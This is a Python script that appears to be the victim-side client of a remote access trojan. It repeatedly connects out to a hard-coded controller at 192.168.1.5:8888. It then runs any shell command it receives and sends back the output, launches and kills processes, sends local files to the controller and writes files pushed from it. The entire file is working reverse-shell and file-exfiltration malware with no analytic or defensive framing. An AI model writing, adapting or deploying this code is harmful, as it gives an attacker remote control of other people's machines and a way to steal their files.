#!/usr/bin/python3
import os
import subprocess
import socket
import time

class Vic():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.__connect__()
        self.__main__()

    def __connect__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:    
            self.s.connect((self.ip,self.port))
        
        except:
            time.sleep(2)
            self.__connect__()

    def download_file(self,f_name):
        try:
            f = open(f_name,'wb')
        except:
            f = open("TMPfailled",'wb')
        self.s.settimeout(1)
        chunk = self.s.recv(1024)
        while(chunk):
            f.write(chunk)
            try:
                chunk = self.s.recv(1024)
            except TimeoutError:
                break
        self.s.settimeout(None)


    def upload_file(self,f_name):
        try:
            f = open(f_name,'rb')
            self.s.send(f.read())
            f.close()
        except Exception as e:
            f = f"[-] {str(e)[str(e).find(']')+2:]}"
            f = f.encode()
            self.s.send(f)

    def __main__(self):
        
        while(1):
            cmd = self.s.recv(100).decode()
            if(cmd[:2] == "cd"):
                try:
                    os.chdir(cmd[3:])
                    self.s.send(b"[+]Directory Changed.")
                
                except Exception as e:
                    data = str(e).encode()
                    self.s.send(data)

            elif (cmd == "quit!"):
                    self.s.close()
                    exit(0)

            elif (cmd[:3] == "run"):
                try:
                    prog = subprocess.Popen([cmd[4:]])
                    data = f"[+]Executed On {prog.pid}"
                    self.s.send(data.encode())
                except:
                    self.s.send(b"[-]Error.COMMOND")
            
            elif (cmd[:5] == "kill!"):
                try:
                    os.kill(int(cmd[6:]),1)
                    self.s.send(b"[+]Executed.")
                except:
                    self.s.send(b"[-]Error.Process")
            
            elif (cmd[:8] == "download"):
                    self.upload_file(cmd[9:])
                    continue

            elif (cmd[:6] == "upload"):
                    self.download_file(cmd[7:])
                    continue

            else:
                    execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    data = execute.stdout.read() + execute.stderr.read()
                    if(len(data) == 0 ):
                           self.s.send(b"[+]Executed.")
                    
                    else:
                           self.s.send(data)
                
                           


Vic("192.168.1.5",8888)
